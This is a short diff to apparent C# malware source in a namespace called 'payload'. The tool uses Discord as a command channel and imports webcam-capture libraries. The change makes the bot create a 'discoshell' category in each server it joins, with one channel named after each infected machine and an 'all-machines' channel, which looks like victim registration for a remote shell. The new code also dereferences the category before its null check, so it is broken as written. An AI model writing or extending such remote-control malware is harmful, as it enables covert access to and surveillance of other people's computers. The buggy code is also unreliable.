@@ -13,6 +13,7 @@ using System.Windows.Forms;
 
 using Discord;
 using Discord.WebSocket;
+using Discord.Rest;
 using Newtonsoft.Json;
 using AForge.Video.DirectShow;
 using AForge.Video;
@@ -68,8 +69,11 @@ namespace payload
         {
             foreach (SocketGuild g in client.Guilds)
             {
-                if (g.Channels.SingleOrDefault(x => x.Name == Environment.MachineName.ToLower()) == null) await g.CreateTextChannelAsync(Environment.MachineName.ToLower());
-                if (g.Channels.SingleOrDefault(x => x.Name == "all-machines") == null) await g.CreateTextChannelAsync("all-machines");
+                SocketCategoryChannel category = g.CategoryChannels.SingleOrDefault(x => x.Name == "discoshell");
+                ulong categoryid = category.Id;
+                if (category == null) categoryid = (await g.CreateCategoryChannelAsync("discoshell")).Id;
+                if (category.Channels.SingleOrDefault(x => x.Name == Environment.MachineName.ToLower()) == null) await g.CreateTextChannelAsync(Environment.MachineName.ToLower(), prop => prop.CategoryId = categoryid);
+                if (category.Channels.SingleOrDefault(x => x.Name == "all-machines") == null) await g.CreateTextChannelAsync("all-machines", prop => prop.CategoryId = categoryid);
             }
         }
 
